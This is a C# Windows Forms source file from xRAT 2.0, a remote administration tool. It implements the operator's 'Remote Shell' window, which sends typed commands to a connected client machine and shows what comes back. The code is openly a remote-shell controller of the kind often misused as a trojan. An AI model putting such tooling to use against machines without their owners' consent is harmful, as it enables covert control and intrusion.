﻿using System;
using System.Windows.Forms;
using xServer.Core;
using System.Drawing;
using xServer.Core.Networking;

namespace xServer.Forms
{
    public interface IRemoteShell
    {
        void PrintMessage(string message);
        void PrintError(string errorMessage);
    }

    public partial class FrmRemoteShell : Form, IRemoteShell
    {
        private readonly Client _connectClient;

        public FrmRemoteShell(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmRs = this;

            InitializeComponent();

            txtConsoleOutput.AppendText(">> Type 'exit' to close this session" + Environment.NewLine);
        }

        private void FrmRemoteShell_Load(object sender, EventArgs e)
        {
            this.DoubleBuffered = true;

            if (_connectClient != null)
                this.Text = string.Format("xRAT 2.0 - Remote Shell [{0}:{1}]",
                    _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
        }

        private void FrmRemoteShell_FormClosing(object sender, FormClosingEventArgs e)
        {
            new Core.Packets.ServerPackets.ShellCommand("exit").Execute(_connectClient);
            if (_connectClient.Value != null)
                _connectClient.Value.FrmRs = null;
        }

        private void txtConsoleOutput_TextChanged(object sender, EventArgs e)
        {
            txtConsoleOutput.SelectionStart = txtConsoleOutput.TextLength;
            txtConsoleOutput.ScrollToCaret();
        }

        private void txtConsoleInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter && !string.IsNullOrEmpty(txtConsoleInput.Text.Trim()))
            {
                string input = txtConsoleInput.Text.TrimStart(' ', ' ').TrimEnd(' ', ' ');
                txtConsoleInput.Text = string.Empty;

                // Split based on the space key.
                string[] splitSpaceInput = input.Split(' ');
                // Split based on the null key.
                string[] splitNullInput = input.Split(' ');

                // We have an exit command.
                if (input == "exit" ||
                    ((splitSpaceInput.Length > 0) && splitSpaceInput[0] == "exit") ||
                    ((splitNullInput.Length > 0) && splitNullInput[0] == "exit"))
                {
                    this.Close();
                }
                else
                {
                    switch (input)
                    {
                        case "cls":
                            txtConsoleOutput.Text = string.Empty;
                            break;
                        default:
                            new Core.Packets.ServerPackets.ShellCommand(input).Execute(_connectClient);
                            break;
                    }
                }

                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        private void txtConsoleOutput_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar != (char) 2)
            {
                txtConsoleInput.Text += e.KeyChar.ToString();
                txtConsoleInput.Focus();
                txtConsoleInput.SelectionStart = txtConsoleOutput.TextLength;
                txtConsoleInput.ScrollToCaret();
            }
        }

        public void PrintMessage(string message)
        {
            try
            {
                txtConsoleOutput.Invoke((MethodInvoker)delegate
                {
                    txtConsoleOutput.AppendText(message);
                });
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    string.Format(
                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
                        ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void PrintError(string errorMessage)
        {
            try
            {
                txtConsoleOutput.Invoke((MethodInvoker)delegate
                {
                    txtConsoleOutput.SelectionColor = Color.Red;
                    txtConsoleOutput.AppendText(errorMessage);
                });
            }
            catch (InvalidOperationException)
            {
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    string.Format(
                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
                        ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}